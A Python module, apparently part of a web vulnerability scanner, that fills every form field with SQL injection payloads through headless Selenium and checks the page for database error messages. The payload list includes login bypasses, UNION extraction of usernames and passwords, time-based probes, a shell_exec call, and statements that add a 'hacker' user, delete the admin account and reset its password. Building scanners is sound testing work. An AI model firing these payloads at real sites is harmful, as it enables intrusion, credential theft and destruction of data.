import app  
from selenium.webdriver.common.by import By
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
import time
 #SQL INJECTION :

def check_sql_form(page=None, source_code=None):
    print("Scanning SQL...")
    payloads = ["'admin' OR '1'='1'","' or 1=1 --","'admin' /!50000UnIoN/ /!50000SeLeCt/ 1,2,3,4,5,6,7,8,9,10,username,12,13,14,password,16,17,18,19,20,21,22,23,24,25/!50000FrOm/ users--","'admin' IF(SUBSTR(@@version,1,1)='5',BENCHMARK(2000000,SHA1(1)),null)--","'admin' AND (SELECT ASCII(SUBSTR((SELECT password FROM users LIMIT 1),1,1))=97)--","'admin'; WAITFOR DELAY '0:0:1'--"," ;SELECT shell_exec('ls')--","');INSERT INTO users (username, password) VALUES ('hacker', '1234');--","');DELETE FROM users WHERE username='admin';--","');UPDATE users SET password=md5('password') WHERE username='admin';--"]
    errorSintax=["SQL syntax error","mysql_fetch","syntax error","warning","error in your SQL syntax","supplied argument is not a valid MySQL result resource","or die(you have an error in your SQL syntax","mysql_num_rows()","mysql_fetch_assoc()","mysql_fetch_array()","mysql_fetch_row()","pg_query()","pg_send_query()","pg_get_result()"]
    for payload in payloads:
        try :
            options = webdriver.FirefoxOptions()
            options.add_argument('-headless')
            driver = webdriver.Firefox(options=options)
        except :
            app.webScanner.error.append("La recherche sql à échoué car il y a un problème avec le driver selenium qui n'est pas installé ou non fonctionel")
            return
        try :
            driver.get(page)
            WebDriverWait(driver, 10).until(lambda driver: driver.execute_script('return document.readyState') == 'complete')#verifie que la page est chargé
            print("get page ok")
            if source_code != None and source_code != "":
                driver.execute_script("document.documentElement.innerHTML ="+str(source_code))


        except :
            app.webScanner.error.append("La recherche sql à échoué car la page est inaccessible")
            return
        # remplir les champs du formulaire avec des entrées malveillantes
        try : 
            fields = driver.find_elements(By.XPATH, "//input | //textarea")
            print("fields ok")
        except :
            app.webScanner.error.append("La recherche sql à échoué car le formulaire n'a pas de champs input")
            return
        for field in fields:
            try : 
                if field.is_displayed():
                    field.send_keys(str(payload))
            except :
                app.webScanner.error.append("La recherche sql à échoué il est impossible d'écrire dans le formulaire")
                return

        # soumettre le formulaire
        try :
            submit_button = driver.find_element(By.XPATH, "//input[@type='submit']")
            submit_button.click()
            print("submit ok")
        except :
            app.webScanner.error.append("La recherche sql à échoué car le formulaire n'a pas de bouton submit")
        

        # vérifier la réponse du serveur pour des indicateurs de vulnérabilité
        WebDriverWait(driver, 0.5)
        codePage = driver.page_source
        for error in errorSintax:
            if error in codePage:
                print("SQL detected with : ",  payload)
                driver.quit()
                return "FAILLE SQL DETECTE DANS LE FORMULAIRE DE LA PAGE : " + str(page) + "\n"
        driver.quit()

        

